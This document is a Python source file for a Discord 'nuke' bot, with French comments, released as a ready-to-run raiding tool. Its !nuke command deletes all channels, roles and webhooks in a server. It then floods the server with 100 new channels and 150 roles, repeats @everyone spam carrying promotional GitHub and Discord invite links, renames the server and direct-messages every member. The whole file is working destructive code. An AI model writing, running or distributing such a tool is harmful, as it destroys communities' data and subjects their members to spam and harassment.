import discord
from discord.ext import commands
import asyncio

# Demande du token et de l'ID du serveur
TOKEN = input("Veuillez entrer le token de votre bot : ")
SERVER_ID = int(input("Veuillez entrer l'ID du serveur : "))

# Description du bot
description = "My github : https://github.com/atxoff"

# Crée une instance de bot avec tous les intents activés
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', description=description, intents=intents)

@bot.event
async def on_ready():
    # Vérifie si le bot est sur le serveur spécifié
    guild = discord.utils.get(bot.guilds, id=SERVER_ID)
    if guild:
        # Change le statut du bot
        await bot.change_presence(activity=discord.Game(name="Atx-dev"))
        print(f'Logged in as {bot.user.name} - {bot.user.id}')
        print(f'Description: {bot.description}')
        print(f'Connected to guild: {guild.name} - {guild.id}')
    else:
        print(f'Le bot n\'est pas connecté au serveur avec l\'ID : {SERVER_ID}')

@bot.command()
async def nuke(ctx):
    guild = ctx.guild
    if guild is None:
        await ctx.send(f"Impossible de trouver le serveur avec l'ID : {SERVER_ID}")
        return

    # Suppression des salons
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"Channel {channel.name} supprimé")
        except Exception as e:
            print(f"Erreur en supprimant {channel.name}: {e}")

    # Suppression des rôles
    for role in guild.roles:
        if role.is_default():
            continue  # Ignore the @everyone role
        try:
            await role.delete()
            print(f"Role {role.name} supprimé")
        except Exception as e:
            print(f"Erreur en supprimant {role.name}: {e}")

    # Suppression des webhooks
    for webhook in await guild.webhooks():
        try:
            await webhook.delete()
            print(f"Webhook {webhook.name} supprimé")
        except Exception as e:
            print(f"Erreur en supprimant {webhook.name}: {e}")

    # Création de 100 salons
    for _ in range(100):
        try:
            await guild.create_text_channel('Nuke-by-atx')
            print("Channel Nuke-by-atx créé")
        except Exception as e:
            print(f"Erreur en créant un channel: {e}")

    # Envoi du message dans tous les salons, répété 10 fois
    message_content = "@everyone @here https://github.com/atxoff et https://discord.gg/WVJwu79WZh"
    for i in range(10):
        print(f"Envoi de la série {i+1}/10 de messages dans les salons")
        for channel in guild.text_channels:
            try:
                await channel.send(message_content)
                print(f"Message envoyé dans {channel.name}")
            except Exception as e:
                print(f"Erreur en envoyant des messages dans {channel.name}: {e}")
        # Attente de 1 seconde avant de répéter l'envoi
        await asyncio.sleep(1)

    # Création de 150 rôles
    for _ in range(150):
        try:
            await guild.create_role(name='Nuke by Atx')
            print("Role Nuke by Atx créé")
        except Exception as e:
            print(f"Erreur en créant un rôle: {e}")

    # Renommer le serveur
    try:
        await guild.edit(name="Nuke by ATX")
        print("Serveur renommé")
    except Exception as e:
        print(f"Erreur en renommant le serveur: {e}")

    # Envoyer des messages privés à tous les membres
    for member in guild.members:
        if member.bot:
            continue  # Ignore les bots
        try:
            await member.send("https://github.com/atxoff et https://discord.gg/WVJwu79WZh")
            print(f"Message envoyé à {member.name}")
        except Exception as e:
            print(f"Erreur en envoyant un message à {member.name}: {e}")

# Lance le bot
bot.run(TOKEN)